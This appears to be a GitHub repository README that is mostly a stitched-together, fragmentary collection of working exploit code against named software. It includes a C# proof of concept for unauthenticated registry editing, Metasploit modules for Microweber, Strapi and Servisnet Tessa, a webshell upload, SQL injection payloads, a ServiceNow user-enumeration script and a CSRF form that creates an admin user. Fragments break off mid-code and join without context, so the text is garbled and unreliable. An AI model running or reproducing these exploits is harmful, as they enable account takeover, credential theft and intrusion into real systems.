# aleyleiftaradogruu
Başlamak
git clone https://github.com/aleyleiftaradogruu/aleyleiftaradogruu.git
git clone https://github.com/aleyleiftaradogruu/aleyleiftaradogruu
public class PersistentRegistryData
{
    public PersistentRegistryCmds cmd;

    public string path;

    public int VDIType;

    public byte[] registryData;
}

[JsonConverter(typeof(StringEnumConverter))]
public enum PersistentRegistryCmds
{
    StoreData = 1,
    DeleteSubTree,
    RestoreData
}
public class Session
{
    public int commandNumber { get; set; }
    public string host { get; set; }
    public string data { get; set; }
    public string sessionName { get; set; }
    public Session(int commandSessionNumber = 0)
    {
        commandNumber = commandSessionNumber;
        switch (commandSessionNumber)
        {
            //Incase it's initiated, kill it immediately.
            case (0):
                Environment.Exit(0x001);
                break;

            //Incase the Ping request is sent though, get its needed data.
            case (2):
                Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                Console.Write("IP: ");
                host = Console.ReadLine();
                Console.WriteLine("Host address set to: " + host);

                data = "pingData";
                sessionName = "PingerRinger";
                break;

            //Incase the RegEdit request is sent though, get its needed data.
            case (49):
                Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                Console.Write("IP: ");
                host = Console.ReadLine();
                Console.WriteLine("Host address set to: " + host);

                PersistentRegistryData persistentRegistryData = new PersistentRegistryData();
                persistentRegistryData.cmd = PersistentRegistryCmds.RestoreData;
                persistentRegistryData.VDIType = 12; //(int)DefaultValues.VDIType;
                                                     //persistentRegistryData.path = "printix\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName";
                Console.WriteLine("\n What Node starting from \\\\Local-Machine\\ would you like to select? \n");
                Console.WriteLine("Example: HKEY_LOCAL_MACHINE\\SOFTWARE\\Intel\\HeciServer\\das\\SocketServiceName\n");
                Console.WriteLine("You can only change values in HKEY_LOCAL_MACHINE");
                Console.Write("Registry Node: ");
                persistentRegistryData.path = "" + Console.ReadLine().Replace("HKEY_LOCAL_MACHINE","printix");
                Console.WriteLine("Full Address Set To:  " + persistentRegistryData.path);

                //persistentRegistryData.registryData = new byte[2];
                //byte[] loader = selectDataType("Intel(R) Capability Licensing stuffidkreally", RegistryValueKind.String);

                Console.WriteLine("\n What Data type are you using? \n1. String 2. Dword  3. Qword 4. Multi String  \n");
                Console.Write("Type:  ");
                int dataF = int.Parse(Console.ReadLine());
                Console.WriteLine("Set Data to: " + dataF);

                Console.WriteLine("\n What value is your type?  \n");
                Console.Write("Value:  ");
                string dataB = Console.ReadLine();
                Console.WriteLine("Set Data to: " + dataF);

                byte[] loader = null;
                List<byte> byteContainer = new List<byte>();
                //Dword = 4
                //SET THIS NUMBER TO THE TYPE OF DATA YOU ARE USING! (CHECK ABOVE FUNCITON selectDataType()!)

                switch (dataF)
                {
                    case (1):

                        loader = selectDataType(dataB, RegistryValueKind.String);
                        byteContainer.Add(1);
                        break;
                    case (2):
                        loader = selectDataType(int.Parse(dataB), RegistryValueKind.DWord);
                        byteContainer.Add(4);
                        break;
                    case (3):
                        loader = selectDataType(long.Parse(dataB), RegistryValueKind.QWord);
                        byteContainer.Add(11);
                        break;
                    case (4):
                        loader = selectDataType(dataB.Split('%'), RegistryValueKind.MultiString);
                        byteContainer.Add(7);
                        break;

                }

                int pathHolder = 0;
                foreach (byte bit in loader)
                {
                    pathHolder++;
                    byteContainer.Add(bit);
                }

                persistentRegistryData.registryData = byteContainer.ToArray();
                //added stuff:

                //PersistentRegistryData data = new PersistentRegistryData();
                //data.cmd = PersistentRegistryCmds.RestoreData;
                //data.path = "";


                //data.cmd
                Console.WriteLine(JsonConvert.SerializeObject(persistentRegistryData));
                data = JsonConvert.SerializeObject(persistentRegistryData);

                break;
            //Custom cases, such as custom JSON Inputs and more.
            case (100):
                Console.WriteLine("\n What Host Address?  (DNS Names Or IP)\n");
                Console.Write("IP: ");
                host = Console.ReadLine();
                Console.WriteLine("Host address set to: " + host);

                Console.WriteLine("\n What Data Should Be Sent?\n");
                Console.Write("Data: ");
                data = Console.ReadLine();
                Console.WriteLine("Data set to: " + data);

                Console.WriteLine("\n What Session Name Should Be Used? \n");
                Console.Write("Session Name: ");
                sessionName = Console.ReadLine();
                Console.WriteLine("Session name set to: " + sessionName);
                break;
        }


    }
    public static byte[] selectDataType(object value, RegistryValueKind format)
    {
        byte[] array = new byte[50];

        switch (format)
        {
            case RegistryValueKind.String: //1
                array = Encoding.UTF8.GetBytes((string)value);
                break;
            case RegistryValueKind.DWord://4
                array = ((!(value.GetType() == typeof(int))) ? BitConverter.GetBytes((long)value) : BitConverter.GetBytes((int)value));
                break;
            case RegistryValueKind.QWord://11
                if (value == null)
                {
                    value = 0L;
                }
                array = BitConverter.GetBytes((long)value);
                break;
            case RegistryValueKind.MultiString://7
                {
                    if (value == null)
                    {
                        value = new string[1] { string.Empty };
                    }
                    string[] array2 = (string[])value;
                    foreach (string s in array2)
                    {
                        byte[] bytes = Encoding.UTF8.GetBytes(s);
                        byte[] second = new byte[1] { (byte)bytes.Length };
                        array = array.Concat(second).Concat(bytes).ToArray();
                    }
                    break;
                }
        }
        return array;
    }
}
class CVESUBMISSION
{
    static void Main(string[] args)
    {
    FORCERESTART:
        try
        {

            //Edit any registry without auth:
            //Use command 49, use the code provided on the desktop...
            //This modifies it directly, so no specific username is needed. :D

            //The command parameter, a list of commands is below.
            int command = 43;

            //To force the user to input variables or not.
            bool forceCustomInput = false;

            //The data to send, this isn't flexible and should be used only for specific examples.
            //Try to keep above 4 characters if you're just shoving things into the command.
            string data = "{\"profileID\":1,\"result\":true}";

            //The username to use.
            //This is to fulfill the requriements whilst in development mode.
            DefaultValues.CurrentSessName = "printixMDNs7914";

            //The host to connect to. DEFAULT= "localhost"
            string host = "192.168.1.29";

        //                                Configuration Above

        InvalidInputLabel:
            Console.Clear();
            Console.WriteLine("Please select the certificate you want to use with port 21338.");
            //Deprecated, certificates are no longer needed to verify, as clientside only uses the self-signed certificates now.
            Console.WriteLine("Already selected, client authentication isn't needed.");

            Console.WriteLine(" /───────────────────────────\\ ");
            Console.WriteLine("\nWhat would you like to do?");
            Console.WriteLine("\n    1. Send Ping Request");
            Console.WriteLine("    2. Send Registry Edit Request");
            Console.WriteLine("    3. Send Custom Request");
            Console.WriteLine("    4. Experimental Mode (Beta)\n");
            Console.Write("I choose option # ");

            try
            {
                switch (int.Parse(Console.ReadLine().ToLower()))
                {
                    case (1):
                        Session session = new Session(2);

                        command = session.commandNumber;
                        host = session.host;
                        data = session.data;
                        DefaultValues.CurrentSessName = "printixReflectorPackage_" + new Random().Next(1, 200);



                        break;
                    case (2):
                        Session sessionTwo = new Session(49);

                        command = sessionTwo.commandNumber;
                        host = sessionTwo.host;
                        data = sessionTwo.data;
                        DefaultValues.CurrentSessName = "printixReflectorPackage_" + new Random().Next(1, 200);

                        break;
                    case (3):

                        Console.WriteLine("What command number do you want to input?");
                        command = int.Parse(Console.ReadLine().ToString());
                        Console.WriteLine("What IP would you like to use? (Default = localhost)");
                        host = Console.ReadLine();
                        Console.WriteLine("What data do you want to send? (Keep over 4 chars if you are not sure!)");
                        data = Console.ReadLine();

                        Console.WriteLine("What session name do you want to use? ");
                        DefaultValues.CurrentSessName = Console.ReadLine();
                        break;
                    case (4):
                        Console.WriteLine("Not yet implemented.");
                        break;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Invalid Input!");
                goto InvalidInputLabel;
            }
            
            Console.WriteLine("Proof Of Concept For CVE-2022-25089 | Version: 1.3.24 | Created by Logan Latvala");
            Console.WriteLine("This is a RAW API, in which you may get unintended results from usage.\n");

            CompCommClient client = new CompCommClient();


            byte[] responseStorage = new byte[25555];
            int responseCMD = 0;
            client.Connect(host, 21338, 3, 10000);

            client.SendMessage(command, Encoding.UTF8.GetBytes(data));
            // Theory: There is always a message being sent, yet it doesn't read it, or can't intercept it.
            // Check for output multiple times, and see if this is conclusive.



            //client.SendMessage(51, Encoding.ASCII.GetBytes(data));
            new Thread(() => {
                //Thread.Sleep(4000);
                if (client.Connected())
                {
                    int cam = 0;
                    // 4 itterations of loops, may be lifted in the future.
                    while (cam < 5)
                    {

                        //Reads the datastream and keeps returning results.
                        //Thread.Sleep(100);
                        try
                        {
                            try
                            {
                                if (responseStorage?.Any() == true)
                                {
                                    //List<byte> byo1 =  responseStorage.ToList();
                                    if (!Encoding.UTF8.GetString(responseStorage).Contains("Caption"))
                                    {
                                        foreach (char cam2 in Encoding.UTF8.GetString(responseStorage))
                                        {
                                            if (!char.IsWhiteSpace(cam2) && char.IsLetterOrDigit(cam2) || char.IsPunctuation(cam2))
                                            {
                                                Console.Write(cam2);
                                            }
                                        }
                                    }else
                                    {
                                        
                                    }
                                }

                            }
                            catch (Exception e) { Debug.WriteLine(e); }
                            client.Read(out responseCMD, out responseStorage);

                        }
                        catch (Exception e)
                        {
                            goto ReadException;
                        }
                        Thread.Sleep(100);
                        cam++;
                        //Console.WriteLine(cam);
                    }

                


                }
                else
                {
                    Console.WriteLine("[WARNING]: Client is Disconnected!");
                }
            ReadException:
                try
                {
                    Console.WriteLine("Command Variable Response: " + responseCMD);
                    Console.WriteLine(Encoding.UTF8.GetString(responseStorage) + " || " + responseCMD);
                    client.disConnect();
                }
                catch (Exception e)
                {
                    Console.WriteLine("After 4.2 Seconds, there has been no response!");
                    client.disConnect();
                }
            }).Start();

            Console.WriteLine(responseCMD);
            Console.ReadLine();

        }

        catch (Exception e)
        {
            Console.WriteLine(e);
            Console.ReadLine();

            //Environment.Exit(e.HResult);
        }

        goto FORCERESTART;
    }
}
 # Use a default template
data = {
    'tutorialid': 'Nottingham',
    'templatename': 'Nottingham',
    'tutorialname': 'exploit',
    'folder_id': ''
}

# Create a new project in order to find the install path
template_id = session.post(xerte_base_url + '/website_code/php/templates/new_template.php', data=data)

# Find template ID
data = {
    'template_id': re.findall('(\d+)', template_id.text)[0]
}

# Find the install path:
install_path = session.post(xerte_base_url + '/website_code/php/properties/media_and_quota_template.php', data=data)
install_path = re.findall('mediapath" value="(.+?)"', install_path.text)[0]

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'nl,en-US;q=0.7,en;q=0.3',
    'Content-Type': 'multipart/form-data; boundary=---------------------------170331411929658976061651588978',
   }

# index.inc file
data = \
'''-----------------------------170331411929658976061651588978
curl -i -s -X POST -F "logo_file=@POC.phtml" "http://$host/show_part_label.php" | grep -o -P '(?<=value="data/media/labels/).*(?=" > <p)'
register_options(
  [
    OptString.new('TARGETURI', [true, 'The base path for Microweber', '/']),
    OptString.new('USERNAME', [true, 'The admin\'s username for Microweber']),
    OptString.new('PASSWORD', [true, 'The admin\'s password for Microweber']),
    OptString.new('LOCAL_FILE_PATH', [true, 'The path of the local file.']),
    OptBool.new('DEFANGED_MODE', [true, 'Run in defanged mode', true])
  ]
)
if res.nil?
  fail_with(Failure::Unreachable, 'Microweber CMS cannot be reached.')
end

print_status 'Checking if it\'s Microweber CMS.'

if res.code == 200 && !res.body.include?('Microweber')
  print_error 'Microweber CMS has not been detected.'
  Exploit::CheckCode::Safe
end

if res.code != 200
  fail_with(Failure::Unknown, res.body)
end

print_good 'Microweber CMS has been detected.'

return check_version(res.body)
begin
  major, minor, build = res_body[/Version:\s+(\d+\.\d+\.\d+)/].gsub(/Version:\s+/, '').split('.')
  version = Rex::Version.new("#{major}.#{minor}.#{build}")
rescue NoMethodError, TypeError
  return Exploit::CheckCode::Safe
end

if version == Rex::Version.new('1.2.10')
  print_good 'Microweber version ' + version.to_s
  return Exploit::CheckCode::Appears
end

print_error 'Microweber version ' + version.to_s

if version < Rex::Version.new('1.2.10')
  print_warning 'The versions that are older than 1.2.10 have not been tested. You can follow the exploitation steps of the official vulnerability report.'
  return Exploit::CheckCode::Unknown
end

return Exploit::CheckCode::Safe
if res.nil?
  fail_with(Failure::Unreachable, 'Log in request failed.')
end

if res.code != 200
  fail_with(Failure::Unknown, res.body)
end

json_res = res.get_json_document

if !json_res['error'].nil? && json_res['error'] == 'Wrong username or password.'
  fail_with(Failure::BadConfig, 'Wrong username or password.')
end

if !json_res['success'].nil? && json_res['success'] == 'You are logged in'
  print_good 'You are logged in.'
  return
end

fail_with(Failure::Unknown, 'An unknown error occurred.')
referer = ''
if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
  referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
else
  referer = full_uri
end

res = send_request_cgi({
  'method' => 'GET',
  'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'upload'),
  'vars_get' => {
    'src' => datastore['LOCAL_FILE_PATH']
  },
  'headers' => {
    'Referer' => referer
  }
})

if res.nil?
  fail_with(Failure::Unreachable, 'Upload request failed.')
end

if res.code != 200
  fail_with(Failure::Unknown, res.body)
end

if res.headers['Content-Type'] == 'application/json'
  json_res = res.get_json_document

  if json_res['success']
    print_good json_res['success']
    return
  end

  fail_with(Failure::Unknown, res.body)
end

fail_with(Failure::BadConfig, 'Either the file cannot be read or the file does not exist.')
referer = ''
if !datastore['VHOST'].nil? && !datastore['VHOST'].empty?
  referer = "http#{datastore['SSL'] ? 's' : ''}://#{datastore['VHOST']}/"
else
  referer = full_uri
end

res = send_request_cgi({
  'method' => 'GET',
  'uri' => normalize_uri(target_uri.path, 'api', 'BackupV2', 'download'),
  'vars_get' => {
    'filename' => filename
  },
  'headers' => {
    'Referer' => referer
  }
})

if res.nil?
  fail_with(Failure::Unreachable, 'Download request failed.')
end

if res.code != 200
  fail_with(Failure::Unknown, res.body)
end

if res.headers['Content-Type'] == 'application/json'
  json_res = res.get_json_document

  if json_res['error']
    fail_with(Failure::Unknown, json_res['error'])
    return
  end
end

print_status res.body
  fail_with(Failure::BadConfig, warning)
end

try_login
try_upload
try_download
                            [+] Perfect Survey - SQL Injection
                            [@] Developed by Ron Jost (Hacker5preme)
with open ("users.txt", "r") as f:
    usernames = f.readlines()
    print (f"[+] Brute forcing ....")
    for users in usernames:
        url = "http://<redacted>/$pwd_reset.do?sysparm_url=ss_default"
        headers1 = {
            "Host": "<redacted>",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "Cookie": "glide_user_route="+glide_user_route+"; JSESSIONID="+JSESSIONID+"; __CJ_g_startTime=\'"+startTime[:-6]+"\'"
            }

        try:
            # s = requests.Session()
            # s.verify = False
            r = requests.get(url, headers=headers1, timeout=20, verify=False, proxies=proxies)
            obj1 = re.findall(r"pwd_csrf_token", r.text)
            obj2 = re.findall(r"fireAll\(\"ck_updated\"", r.text)
            tokenIndex = (r.text.index(obj1[0]))
            startTime2 = (str(time.time_ns()))
            # userTokenIndex = (r.text.index(obj2[0]))
            # userToken = (r.text[userTokenIndex+23 : userTokenIndex+95])
            token = (r.text[tokenIndex+45:tokenIndex+73])
            url = "http://<redacted>/xmlhttp.do"
            headers2 = {
                "Host": "<redacted>",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Referer": "http://<redacted>/$pwd_reset.do?sysparm_url=ss default",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "Content-Length": "786",
                "Origin": "http://<redacted>/",
                "Connection": "keep-alive",
                # "X-UserToken":""+userToken+"",
                "Cookie": "glide_user_route="+glide_user_route+";JSESSIONID="+JSESSIONID+"; __CJ_g_startTime=\'"+startTime2[:-6]+"\'"
                }

            data = {
                "sysparm_processor": "PwdAjaxVerifyIdentity",
                "sysparm_scope": "global",
                "sysparm_want_session_messages": "true",
                "sysparm_name":"verifyIdentity",
                "sysparm_process_id":"c6b0c20667100200a5a0f3b457415ad5",
                "sysparm_processor_id_0":"fb9b36b3bf220100710071a7bf07390b",
                "sysparm_user_id_0":""+users.strip()+"",
                "sysparm_identification_number":"1",
                "sysparam_pwd_csrf_token":""+token+"",
                "ni.nolog.x_referer":"ignore",
                "x_referer":"$pwd_reset.do?sysparm_url=ss_default"
                }

            payload_str = urllib.parse.urlencode(data, safe=":+")

        except requests.exceptions.Timeout:
            print ("[!] Connection to host timed out !")
            sys.exit(1)

        try:
            # s = requests.Session()
            # s.verify = False
            time.sleep(2)
            r = requests.post(url, headers=headers2, data=payload_str, timeout=20, verify=False, proxies=proxies)
            if "500" in r.text:
                print (Fore.RED + f"[-] Invalid user: {users.strip()}" + Style.RESET_ALL)
                f = open("enumeratedUserList.txt", "a+")
                f.write(Fore.RED + f"[-] Invalid user: {users.strip()}\n" + Style.RESET_ALL)
                f.close()
            elif "200" in r.text:
                print (Fore.GREEN + f"[+] Valid user: {users.strip()}" + Style.RESET_ALL)
                f = open("enumeratedUserList.txt", "a+")
                f.write(Fore.GREEN + f"[+] Valid user: {users.strip()}\n" + Style.RESET_ALL)
                f.close()
            else:
                print (Fore.RED + f"[-] Invalid user: {users.strip()}" + Style.RESET_ALL)
                f = open("enumeratedUserList.txt", "a+")
                f.write(Fore.RED + f"[-] Invalid user: {users.strip()}\n" + Style.RESET_ALL)
                f.close()
        except KeyboardInterrupt:
            sys.exit()
        except requests.exceptions.Timeout:
            print ("[!] Connection to host timed out !")
            sys.exit(1)
        except Exception as e:
            print (Fore.RED + f"Unable to connect to host" + Style.RESET_ALL)
                                    [+] WP User Frontend - SQL Injection
                                    [@] Developed by Ron Jost (Hacker5preme)
                    [+] Copy Content Protection and Content Locking - SQL Injection
                    [@] Developed by Ron Jost (Hacker5preme)
---
Parameter: loginid (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: loginid=hackedpassword=hacked' or '6681'='6681' AND
(SELECT 1959 FROM (SELECT(SLEEP(3)))PuyC) AND
'sDHP'='sDHP&rememberme=on&submit=Login
---
Type: UNION query
Title: Generic UNION query (NULL) - 6 columns
Payload: email=test@test.com' UNION ALL SELECT
with requests.Session() as s:
    headers = { 'Cookie':'wordpress_test_cookie=WP Cookie check',
             'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15' }

    post_data={ 'log':username, 'pwd':password,
               'wp-submit':'Log In','redirect_to':wp_path,
               'testcookie':'1'
                   } 
    
    s.post(login, headers=headers, data=post_data)
    resp = s.get(wp_path)

    out_file = open("output.txt", "w")
    print(resp.text, file=out_file)
    out_file.close()
    print(color_random[4]+resp.text)
    out = color_random[5]+"\n[+] Output Saved as: output.txt\n"
    print(out)
Type: UNION query
Title: MySQL UNION query (random number) - 1 column
Payload: email=riiVAqjG@https://github.com/kishan0725/Hospital-Management-System'+(select-2730)
Type: UNION query
Title: MySQL UNION query (random number) - 1 column
Payload: username3=CHnDaCTc'+(select-3282) UNION ALL SELECT
<form action="http://127.0.0.1:8080/api/users" method="POST" enctype="text/plain" name="exploit">

  <!-- Change the "scope" parameter in the payload as your choice -->

  <input type="hidden" name='{"what":"user","which":[],"data":{"scope":"../../../../root/","locale":"en","viewMode":"mosaic","singleClick":false,"sorting":{"by":"","asc":false},"perm":{"admin":true,"execute":true,"create":true,"rename":true,"modify":true,"delete":true,"share":true,"download":true},"commands":[],"hideDotfiles":false,"username":"pwned","password":"","rules":[{"allow":true,"path":"../","regex":false,"regexp":{"raw":""}}],"lockPassword":false,"id":0,"password":"pwned"}}' value='test'>

</form>
  'Name'           => "Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)",
  'Description'    => %q{
    This exploit module abuses the mishandling of password reset in JSON for Strapi CMS version 3.0.0-beta.17.4 to change the password of a privileged user.
  },
  'License'        => MSF_LICENSE,
  'Author'         => [ 'WackyH4cker' ],
  'References'     =>
    [
      [ 'URL', 'https://vulners.com/cve/CVE-2019-18818' ]
    ],
  'Platform'       => 'linux',
  'Targets'        => [
    [ 'Strapi 3.0.0-beta-17.4', {} ]
  ],
  'Payload'        => '',
  'Privileged'     => true,
  'DisclosureDate' => "",
  'DefaultOptions' =>
    {
      'SSL' => 'False',
      'RPORT' => 80,
    },
  'DefaultTarget'  => 0

  ))

  register_options [
    OptString.new('NEW_PASSWORD', [true, 'New password for user Admin'])
  ]
res = send_request_raw({ 'uri' => '/admin/init' })
version = JSON.parse(res.body)

if version["data"]["strapiVersion"] == '3.0.0-beta.17.4'
  return Exploit::CheckCode::Vulnerable
else
  return Exploit::CheckCode::Safe
end
json_body = { 'code' => {'$gt' => 0},
  'password' => datastore['NEW_PASSWORD'],
  'passwordConfirmation' => datastore['NEW_PASSWORD'] }

res = send_request_cgi({
  'method' => 'POST',
  'uri' => '/admin/auth/reset-password',
  'ctype' => 'application/json',
  'data' => JSON.generate(json_body)
})

print_status("Changing password...")
json_format = JSON.parse(res.body)
jwt = json_format['jwt']

if res.code == 200
  print_good("Password changed successfully!")
  print_good("USER: admin")
  print_good("PASSWORD: #{datastore['NEW_PASSWORD']}")
  print_good("JWT: #{jwt}")
else
  fail_with(Failure::NoAccess"Could not change admin user password")
end
  ),
  'References'     =>
    [
      [ 'CVE', 'CVE-2022-22831' ],
      [ 'URL', 'https://www.pentest.com.tr/exploits/Servisnet-Tessa-Add-sysAdmin-User-Unauthenticated.html' ],
      [ 'URL', 'http://www.servisnet.com.tr/en/page/products' ]
    ],
  'Author'         =>
    [
      'Özkan Mustafa AKKUŞ <AkkuS>' # Discovery & PoC & MSF Module @ehakkus
    ],
  'License'        => MSF_LICENSE,
  'DisclosureDate' => "Dec 22 2021",
  'DefaultOptions' =>
    {
      'RPORT' => 443,
      'SSL'   => true
    }
))

register_options([
    OptString.new('TARGETURI',  [true, 'Base path for application', '/'])
])
if res && res.code == 200 && res.body =~ /baseURL/
  data = res.body
  #word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
  base_url = data.scan(/baseURL: '\/([\S\s]*?)'/)[0]
  print_status("baseURL: #{base_url}") 
  return base_url
else
  fail_with(Failure::NotVulnerable, 'baseURL not found!')
end
 res = send_request_cgi(
   {
   'method' => 'POST',
   'ctype'  => 'application/json',
   'uri' => normalize_uri(target_uri.path, app_path, 'users'),
   'headers' =>
     {
       'Authorization' => token
     },
   'data' => json_data
  })

  if res && res.code == 200 && res.body =~ /localhost/
    print_good("The sysAdmin authorized user has been successfully added.")
    print_status("Username: #{newuser}")
    print_status("Password: 1111111111")
  else
    fail_with(Failure::NotVulnerable, 'An error occurred while adding the user. Try again.')
  end
res = send_request_cgi({
# default.a.defaults.headers.post["Authorization"] check
  'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
  'method'  => 'GET'
})     

if res && res.code == 200 && res.body =~ /default.a.defaults.headers.post/
  token = split(res.body, 'Authorization')
  print_status("Authorization: #{token}") 
      return token
else
  fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
end
if auth_bypass =~ /Basic/
  return Exploit::CheckCode::Vulnerable
else
  return Exploit::CheckCode::Safe
end
    The module tries to log in to the MQTT service with the credentials it has obtained,
    and reflects the response it receives from the service.   

  ),
  'References'     =>
    [
      [ 'CVE', 'CVE-2022-22833' ],
      [ 'URL', 'https://pentest.com.tr/exploits/Servisnet-Tessa-MQTT-Credentials-Dump-Unauthenticated.html' ],
      [ 'URL', 'http://www.servisnet.com.tr/en/page/products' ]
    ],
  'Author'         =>
    [
      'Özkan Mustafa AKKUŞ <AkkuS>' # Discovery & PoC & MSF Module @ehakkus
    ],
  'License'        => MSF_LICENSE,
  'DisclosureDate' => "Dec 22 2021",
  'DefaultOptions' =>
    {
      'RPORT' => 443,
      'SSL'   => true
    }
))

register_options([
    OptString.new('TARGETURI',  [true, 'Base path for application', '/'])
])
 'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
 'method'  => 'GET'
  print_status("##### Starting MQTT login sweep #####")

  # Removed brute force materials that can be included for the collection.
  cred_collection = Metasploit::Framework::CredentialCollection.new(
    password: mqtt_pass,
    username: mqtt_usr
  )
  # this definition already exists in "auxiliary/scanner/mqtt/connect". Moved into exploit.
  cred_collection = prepend_db_passwords(cred_collection)

  scanner = Metasploit::Framework::LoginScanner::MQTT.new(
    host: rhost,
    port: mqtt_port,
    read_timeout: datastore['READ_TIMEOUT'],
    client_id: client_id,
    proxies: datastore['PROXIES'],
    cred_details: cred_collection,
    stop_on_success: datastore['STOP_ON_SUCCESS'],
    bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
    connection_timeout: datastore['ConnectTimeout'],
    max_send_size: datastore['TCP::max_send_size'],
    send_delay: datastore['TCP::send_delay'],
    framework: framework,
    framework_module: self,
    ssl: datastore['SSL'],
    ssl_version: datastore['SSLVersion'],
    ssl_verify_mode: datastore['SSLVerifyMode'],
    ssl_cipher: datastore['SSLCipher'],
    local_port: datastore['CPORT'],
    local_host: datastore['CHOST']
  )

  scanner.scan! do |result|
    credential_data = result.to_h
    credential_data.merge!(
      module_fullname: fullname,
      workspace_id: myworkspace_id
    )
    password = result.credential.private
    username = result.credential.public
    if result.success?
      credential_core = create_credential(credential_data)
      credential_data[:core] = credential_core
      create_credential_login(credential_data)
      print_good("MQTT Login Successful: #{username}/#{password}")
    else
      invalidate_login(credential_data)
      vprint_error("MQTT LOGIN FAILED: #{username}/#{password} (#{result.proof})")
    end
  end
 end
if res && res.code == 200 && res.body =~ /default.a.defaults.headers.post/
 token = split(res.body, 'Authorization')
 print_status("Authorization: #{token}") 
 return token
else
 fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
end
            var token = Buffer.from(`${user.username}:${user.usersessionid}`, 'utf8').toString('base64');

            The logic required for the Authorization header is as above.
            Therefore, after accessing an authorized user ID value and active sessionId value,
            if the username and sessionId values are encoded with base64, a valid Token will be obtained and a new admin user can be added.       

  ),
  'References'     =>
    [
      [ 'CVE', 'CVE-2022-22832' ],
      [ 'URL', 'https://www.pentest.com.tr/exploits/Servisnet-Tessa-Privilege-Escalation.html' ],
      [ 'URL', 'http://www.servisnet.com.tr/en/page/products' ]
    ],
  'Author'         =>
    [
      'Özkan Mustafa AKKUŞ <AkkuS>' # Discovery & PoC & MSF Module @ehakkus
    ],
  'License'        => MSF_LICENSE,
  'DisclosureDate' => "Dec 22 2021",
  'DefaultOptions' =>
    {
      'RPORT' => 443,
      'SSL'   => true
    }
))

register_options([
OptString.new('USERNAME',  [true, 'Servisnet Username']),
    OptString.new('PASSWORD',  [true, 'Servisnet Password']),
    OptString.new('TARGETURI',  [true, 'Base path for application', '/'])
])
if res && res.code == 200 && res.body =~ /baseURL/
  data = res.body
  #word = data.scan(/"#{string_to_split}"\] = "([\S\s]*?)"/)
  base_url = data.scan(/baseURL: '\/([\S\s]*?)'/)[0] 
  return base_url
else
  fail_with(Failure::NotVulnerable, 'baseURL not found!')
end
 res = send_request_cgi(
   {
   'method' => 'POST',
   'ctype'  => 'application/json',
   'uri' => normalize_uri(target_uri.path, app_path, 'users'),
   'headers' =>
     {
       'Authorization' => token
     },
   'data' => json_data
  })

  if res && res.code == 200 && res.body =~ /localhost/
    print_good("The sysAdmin authorized user has been successfully added.")
    print_status("Username: #{newuser}")
    print_status("Password: 1111111111")
  else
    fail_with(Failure::NotVulnerable, 'An error occurred while adding the user. Try again.')
  end
res = send_request_cgi({
# user.usersessionid check
  'uri'     => normalize_uri(target_uri.path, 'js', 'app.js'),
  'method'  => 'GET'
})     

if res && res.code == 200 && res.body =~ /user.usersessionid/
      return Exploit::CheckCode::Vulnerable
else
  fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
end
res = send_request_cgi({
# token check
  'uri'     => normalize_uri(target_uri.path, app_path, 'users', userid),
  'headers' =>
     {
       'Authorization' => token
     },
  'method'  => 'GET'
})     

if not res && res.code == 200 && res.body =~ /usersessionid/
  fail_with(Failure::NotVulnerable, 'An error occurred while use Token. Try again.')
end

loopid = userid.to_i
$i = 0
# The admin userid must be less than the low-authority userid.
while $i < loopid  do
  $i +=1
  res = send_request_cgi({
   # token check
     'uri'     => normalize_uri(target_uri.path, app_path, 'users', $i),
     'headers' =>
        {
          'Authorization' => token
        },
     'method'  => 'GET'
   }) 

   if res.code == 200 and res.body.include? '"Sistem Admin"'
     admin_uname = splitJSON(res.body, 'username')
     admin_sessid = splitJSON(res.body, 'usersessionid')
     admin_userid = splitJSON2(res.body, 'id')
     enc_token = Rex::Text.encode_base64('' + admin_uname + ':' + admin_sessid + '')
     token_admin = 'Basic ' + enc_token + ''
     print_good("Excellent! Admin user found.")
     print_good("Admin Username: #{admin_uname}")
     print_good("Admin SessionId: #{admin_sessid}")
     if session_check(token_admin, admin_userid, admin_uname) == "OK"
       break
     end
   end
 end
  res = send_request_cgi({
   # session check
     'uri'     => normalize_uri(target_uri.path, app_path, 'users', userid),
     'headers' =>
        {
          'Authorization' => token
        },
     'method'  => 'GET'
   }) 

   if res && res.code == 200 && res.body =~ /managers_codes/
     print_good("Admin session is active.")
     add_user(token, app_path)
     return "OK"
   else
     print_status("Admin user #{user} is not online. Try again later.")
     return "NOT"
   end   
 json_data = '{"username": "' + user + '", "password": "' + pass + '"}'

 res = send_request_cgi(
   {
   'method' => 'POST',
   'ctype'  => 'application/json',
   'uri' => normalize_uri(target_uri.path, app_path, 'api', 'auth', 'signin'),
   'data' => json_data
  })   

  if res && res.code == 200 && res.body =~ /usersessionid/
sessid = splitJSON(res.body, 'usersessionid')
userid = splitJSON2(res.body, 'id')
